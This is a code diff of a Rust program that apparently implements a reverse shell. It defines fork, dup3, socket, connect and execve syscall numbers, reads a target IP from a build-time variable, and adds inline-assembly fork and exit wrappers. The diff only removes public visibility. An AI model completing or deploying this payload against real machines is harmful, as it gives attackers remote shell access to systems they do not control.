@@ -7,21 +7,21 @@ const IP: &str = core::env!("IP");
 
 #[cfg(target_arch = "x86_64")]
 mod consts {
-    pub const SYS_FORK: usize = 57;
-    pub const SYS_DUP3: usize = 292;
-    pub const SYS_SOCKET: usize = 41;
-    pub const SYS_CONNECT: usize = 42;
-    pub const SYS_EXECVE: usize = 59;
-    pub const SYS_EXIT: usize = 60;
+    const SYS_FORK: usize = 57;
+    const SYS_DUP3: usize = 292;
+    const SYS_SOCKET: usize = 41;
+    const SYS_CONNECT: usize = 42;
+    const SYS_EXECVE: usize = 59;
+    const SYS_EXIT: usize = 60;
 }
 
 #[cfg(target_arch = "aarch64")]
 mod consts {
-    pub const SYS_DUP3: usize = 24;
-    pub const SYS_SOCKET: usize = 198;
-    pub const SYS_CONNECT: usize = 203;
-    pub const SYS_EXECVE: usize = 221;
-    pub const SYS_EXIT: usize = 93;
+    const SYS_DUP3: usize = 24;
+    const SYS_SOCKET: usize = 198;
+    const SYS_CONNECT: usize = 203;
+    const SYS_EXECVE: usize = 221;
+    const SYS_EXIT: usize = 93;
 }
 use consts::*;
 
@@ -109,7 +109,7 @@ unsafe fn sys_dup3(arg1: usize, arg2: usize, arg3: isize) -> usize {
     ret
 }
 
-pub fn ip_str_to_beu32(ipv4_str: &str) -> u32 {
+fn ip_str_to_beu32(ipv4_str: &str) -> u32 {
     let ip_it = ipv4_str.split('.');
     let mut r = [0u8; 4];
     for (idx, b) in ip_it.enumerate() {
@@ -122,12 +122,12 @@ pub fn ip_str_to_beu32(ipv4_str: &str) -> u32 {
     res.to_be()
 }
 
-pub enum ForkResult {
+enum ForkResult {
     Parent(u32),
     Child,
 }
 
-pub fn exit(ret: isize) -> ! {
+fn exit(ret: isize) -> ! {
     #[cfg(target_arch = "x86_64")]
     unsafe {
         asm!(
@@ -148,7 +148,7 @@ pub fn exit(ret: isize) -> ! {
     }
 }
 
-pub fn fork() -> Result<ForkResult, i32> {
+fn fork() -> Result<ForkResult, i32> {
     let mut result: isize;
 
     #[cfg(target_arch = "x86_64")]
